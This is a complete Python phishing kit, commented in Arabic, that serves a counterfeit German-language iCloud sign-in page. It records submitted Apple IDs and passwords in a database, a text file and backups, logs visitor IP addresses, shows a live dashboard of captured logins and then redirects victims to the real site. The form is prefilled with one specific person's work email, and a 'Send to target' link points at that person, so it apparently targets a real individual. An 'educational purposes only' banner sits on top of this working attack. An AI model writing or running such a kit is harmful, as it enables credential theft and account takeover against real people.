#!/usr/bin/env python3
"""
🎯 iCloud Phishing SuperTool - ملف واحد شامل
⚠️ للأغراض التعليمية فقط في بيئة اختبار مصرح بها
"""

import http.server
import socketserver
import threading
import json
import sqlite3
import os
from datetime import datetime
from urllib.parse import urlparse, parse_qs
import base64
import hashlib
from http import HTTPStatus
import ssl

class iCloudPhishingSuperTool:
    def __init__(self):
        self.port_web = 8000          # صفحة iCloud المزيفة
        self.port_api = 8080          # استقبال البيانات
        self.credentials_file = "CAPTURED_CREDENTIALS.txt"
        self.database_file = "icloud_data.db"
        self.setup_directories()
        
    def setup_directories(self):
        """إنشاء المجلدات الضرورية"""
        os.makedirs("logs", exist_ok=True)
        os.makedirs("backups", exist_ok=True)
        
    def create_icloud_page(self):
        """إنشاء صفحة iCloud مزيفة ديناميكياً"""
        return f'''
<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>iCloud - Apple</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }}
        body {{ background: #F5F5F7; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }}
        .container {{ width: 100%; max-width: 420px; background: white; border-radius: 12px; box-shadow: 0 4px 24px rgba(0,0,0,0.1); overflow: hidden; }}
        .header {{ padding: 32px; text-align: center; border-bottom: 1px solid #E5E5EA; }}
        .apple-logo {{ font-size: 48px; color: #000; margin-bottom: 20px; }}
        .header h1 {{ font-size: 24px; font-weight: 600; color: #000; margin-bottom: 8px; }}
        .header p {{ font-size: 14px; color: #8E8E93; }}
        .form {{ padding: 32px; }}
        .input-group {{ margin-bottom: 20px; }}
        .input-group label {{ display: block; font-size: 14px; color: #000; margin-bottom: 6px; font-weight: 500; }}
        .apple-input {{ width: 100%; padding: 14px 16px; border: 1px solid #C7C7CC; border-radius: 8px; font-size: 16px; }}
        .apple-input:focus {{ outline: none; border-color: #007AFF; }}
        .apple-button {{ width: 100%; padding: 16px; background: #007AFF; color: white; border: none; border-radius: 8px; font-size: 17px; font-weight: 600; cursor: pointer; }}
        .security-info {{ margin-top: 20px; padding: 12px; background: #F2F2F7; border-radius: 6px; font-size: 12px; color: #8E8E93; text-align: center; }}
        .footer {{ padding: 20px; text-align: center; font-size: 12px; color: #8E8E93; border-top: 1px solid #E5E5EA; }}
        .loading {{ display: none; font-size: 14px; color: #007AFF; text-align: center; margin-top: 10px; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="apple-logo"></div>
            <h1>Bei iCloud anmelden</h1>
            <p>Melden Sie sich mit Ihrer Apple-ID an</p>
        </div>
        
        <form class="form" id="icloudForm" onsubmit="return submitForm()">
            <div class="input-group">
                <label for="appleId">Apple-ID</label>
                <input type="email" id="appleId" class="apple-input" placeholder="name@beispiel.com" value="langer.steffen@convex-bau.de" required>
            </div>
            
            <div class="input-group">
                <label for="password">Passwort</label>
                <input type="password" id="password" class="apple-input" placeholder="••••••••" required>
            </div>
            
            <button type="submit" class="apple-button" id="submitBtn">Weiter</button>
            <div id="loading" class="loading">Wird überprüft...</div>
            
            <div class="security-info">
                🔐 Sichere Verbindung • {datetime.now().strftime("%d.%m.%Y %H:%M")}
            </div>
        </form>
        
        <div class="footer">
            Apple-ID oder Passwort vergessen? • Datenschutzrichtlinie
        </div>
    </div>

    <script>
        function submitForm() {{
            const btn = document.getElementById('submitBtn');
            const loading = document.getElementById('loading');
            const appleId = document.getElementById('appleId').value;
            const password = document.getElementById('password').value;
            
            btn.disabled = true;
            btn.style.opacity = '0.7';
            loading.style.display = 'block';
            
            // إرسال البيانات
            fetch('/submit-login', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify({{
                    appleId: appleId,
                    password: password,
                    userAgent: navigator.userAgent,
                    time: new Date().toISOString()
                }})
            }})
            .then(response => response.json())
            .then(data => {{
                if (data.success) {{
                    // بعد 2 ثانية، توجيه إلى iCloud الحقيقي
                    setTimeout(() => {{
                        window.location.href = 'https://www.icloud.com';
                    }}, 2000);
                }}
            }})
            .catch(() => {{
                setTimeout(() => {{
                    window.location.href = 'https://www.icloud.com';
                }}, 1000);
            }});
            
            return false;
        }}
        
        // عند تحميل الصفحة، تسجيل الزيارة
        fetch('/track-visit?ref=icloud_page');
    </script>
</body>
</html>
'''
    
    def create_database(self):
        """إنشاء قاعدة البيانات"""
        conn = sqlite3.connect(self.database_file)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                apple_id TEXT NOT NULL,
                password TEXT NOT NULL,
                ip_address TEXT,
                user_agent TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS visits (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT,
                user_agent TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        conn.commit()
        conn.close()
    
    def save_credentials(self, apple_id, password, ip, user_agent):
        """حفظ بيانات الدخول"""
        # حفظ في قاعدة البيانات
        conn = sqlite3.connect(self.database_file)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO credentials (apple_id, password, ip_address, user_agent) VALUES (?, ?, ?, ?)",
            (apple_id, password, ip, user_agent)
        )
        conn.commit()
        conn.close()
        
        # حفظ في ملف نصي
        with open(self.credentials_file, "a", encoding="utf-8") as f:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"\n{'='*60}\n")
            f.write(f"🎯 CREDENTIAL CAPTURED!\n")
            f.write(f"📧 Apple-ID: {apple_id}\n")
            f.write(f"🔑 Password: {password}\n")
            f.write(f"🌐 IP: {ip}\n")
            f.write(f"📱 Device: {user_agent[:100]}\n")
            f.write(f"⏰ Time: {timestamp}\n")
            f.write(f"{'='*60}\n")
        
        # طباعة فورية
        print(f"\n{'='*60}")
        print(f"🎯 CREDENTIAL CAPTURED!")
        print(f"📧 Apple-ID: {apple_id}")
        print(f"🔑 Password: {password}")
        print(f"🌐 IP: {ip}")
        print(f"⏰ Time: {datetime.now().strftime('%H:%M:%S')}")
        print(f"{'='*60}\n")
        
        # حفظ نسخة احتياطية
        backup_file = f"backups/cred_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(backup_file, "w", encoding="utf-8") as f:
            json.dump({
                "apple_id": apple_id,
                "password": password,
                "ip": ip,
                "user_agent": user_agent,
                "timestamp": datetime.now().isoformat()
            }, f, indent=2)
    
    def log_visit(self, ip, user_agent):
        """تسجيل الزيارة"""
        conn = sqlite3.connect(self.database_file)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO visits (ip, user_agent) VALUES (?, ?)",
            (ip, user_agent)
        )
        conn.commit()
        conn.close()
        
        print(f"👀 Visit from: {ip} - {user_agent[:50]}")
    
    class iCloudHandler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            tool = self.server.tool
            parsed = urlparse(self.path)
            
            if parsed.path == '/':
                # عرض صفحة iCloud
                self.send_response(200)
                self.send_header('Content-type', 'text/html; charset=utf-8')
                self.end_headers()
                self.wfile.write(tool.create_icloud_page().encode('utf-8'))
            
            elif parsed.path == '/track-visit':
                # تسجيل الزيارة
                client_ip = self.client_address[0]
                user_agent = self.headers.get('User-Agent', 'Unknown')
                tool.log_visit(client_ip, user_agent)
                self.send_response(200)
                self.end_headers()
            
            else:
                self.send_error(404, "Not Found")
        
        def do_POST(self):
            tool = self.server.tool
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            
            if self.path == '/submit-login':
                try:
                    data = json.loads(post_data.decode('utf-8'))
                    apple_id = data.get('appleId', '').strip()
                    password = data.get('password', '').strip()
                    user_agent = data.get('userAgent', 'Unknown')
                    client_ip = self.client_address[0]
                    
                    if apple_id and password:
                        tool.save_credentials(apple_id, password, client_ip, user_agent)
                    
                    response = json.dumps({"success": True}).encode('utf-8')
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.send_header('Content-length', len(response))
                    self.end_headers()
                    self.wfile.write(response)
                    
                except Exception as e:
                    self.send_error(500, f"Server Error: {str(e)}")
            
            else:
                self.send_error(404, "Not Found")
        
        def log_message(self, format, *args):
            """تعطيل السجلات الافتراضية"""
            pass
    
    def start_web_server(self):
        """تشغيل خادم الويب"""
        handler = self.iCloudHandler
        handler.extensions_map.update({
            '.html': 'text/html',
            '.css': 'text/css',
            '.js': 'application/javascript',
        })
        
        with socketserver.TCPServer(("", self.port_web), handler) as httpd:
            httpd.tool = self  # تمرير المرجع
            print(f"🌐 iCloud Phishing Page: http://localhost:{self.port_web}")
            print(f"📡 API Endpoint: http://localhost:{self.port_web}/submit-login")
            print(f"📝 Monitoring: tail -f {self.credentials_file}")
            print("="*60)
            httpd.serve_forever()
    
    def display_stats(self):
        """عرض الإحصائيات"""
        while True:
            os.system('clear' if os.name == 'posix' else 'cls')
            print("\n" + "="*60)
            print("📊 iCloud Phishing SuperTool - Live Dashboard")
            print("="*60)
            
            try:
                conn = sqlite3.connect(self.database_file)
                cursor = conn.cursor()
                
                # عدد الزيارات
                cursor.execute("SELECT COUNT(*) FROM visits")
                visits = cursor.fetchone()[0]
                
                # عدد الباسووردات المسروقة
                cursor.execute("SELECT COUNT(*) FROM credentials")
                creds = cursor.fetchone()[0]
                
                # آخر 3 محاولات
                cursor.execute("SELECT apple_id, timestamp FROM credentials ORDER BY id DESC LIMIT 3")
                last_attempts = cursor.fetchall()
                
                conn.close()
                
                print(f"\n📈 Statistics:")
                print(f"   • Total Visits: {visits}")
                print(f"   • Credentials Captured: {creds}")
                
                print(f"\n🕐 Last Attempts:")
                for apple_id, timestamp in last_attempts:
                    print(f"   • {apple_id} - {timestamp}")
                
                print(f"\n📁 Files:")
                print(f"   • Credentials: {self.credentials_file}")
                print(f"   • Database: {self.database_file}")
                print(f"   • Backups: backups/")
                
                print(f"\n🌐 URLs:")
                print(f"   • Phishing Page: http://localhost:{self.port_web}")
                print(f"   • Send to target: http://localhost:{self.port_web}/?email=langer.steffen@convex-bau.de")
                
                print(f"\n" + "="*60)
                print("Press Ctrl+C to stop | Auto-refresh every 5 seconds")
                
            except Exception as e:
                print(f"Error: {e}")
            
            import time
            time.sleep(5)
    
    def run(self):
        """تشغيل النظام كاملاً"""
        print("🚀 Starting iCloud Phishing SuperTool...")
        print("="*60)
        
        # إنشاء قاعدة البيانات
        self.create_database()
        
        # تشغيل خادم الويب في thread منفصل
        web_thread = threading.Thread(target=self.start_web_server, daemon=True)
        web_thread.start()
        
        # عرض الإحصائيات في thread منفصل
        stats_thread = threading.Thread(target=self.display_stats, daemon=True)
        stats_thread.start()
        
        # البقاء في الخلفية
        try:
            while True:
                import time
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n\n👋 Shutting down...")
            print(f"📊 Final stats saved in {self.database_file}")
            print(f"🔑 Credentials in {self.credentials_file}")
            print("✅ Done!")

# ==================== تشغيل سريع ====================

def quick_start():
    """تشغيل سريع بضغطة واحدة"""
    import sys
    
    if len(sys.argv) > 1 and sys.argv[1] == "help":
        print("""
        🎯 iCloud Phishing SuperTool - Quick Commands:
        
        python3 icloud_onefile.py          # تشغيل النظام كاملاً
        python3 icloud_onefile.py stats    # عرض الإحصائيات فقط
        python3 icloud_onefile.py view     # عرض الباسووردات المسروقة
        python3 icloud_onefile.py test     # اختبار إرسال بيانات وهمية
        python3 icloud_onefile.py clean    # حذف جميع البيانات
        """)
        return
    
    tool = iCloudPhishingSuperTool()
    
    if len(sys.argv) > 1:
        command = sys.argv[1]
        
        if command == "stats":
            tool.display_stats()
        
        elif command == "view":
            if os.path.exists(tool.credentials_file):
                with open(tool.credentials_file, "r", encoding="utf-8") as f:
                    print(f.read())
            else:
                print("No credentials captured yet.")
        
        elif command == "test":
            # اختبار إرسال بيانات وهمية
            tool.save_credentials(
                "test@icloud.com",
                "TestPassword123",
                "127.0.0.1",
                "Test User Agent"
            )
            print("✅ Test credentials saved!")
        
        elif command == "clean":
            if input("⚠️ Delete ALL data? (y/n): ").lower() == 'y':
                for file in [tool.credentials_file, tool.database_file]:
                    if os.path.exists(file):
                        os.remove(file)
                import shutil
                if os.path.exists("backups"):
                    shutil.rmtree("backups")
                if os.path.exists("logs"):
                    shutil.rmtree("logs")
                print("✅ All data cleaned!")
        
        else:
            print(f"Unknown command: {command}")
    
    else:
        # التشغيل العادي
        tool.run()

# ==================== تشغيل مباشر ====================

if __name__ == "__main__":
    print("="*60)
    print("🎯 iCloud Phishing SuperTool")
    print("⚠️ FOR EDUCATIONAL PURPOSES ONLY")
    print("="*60)
    
    quick_start()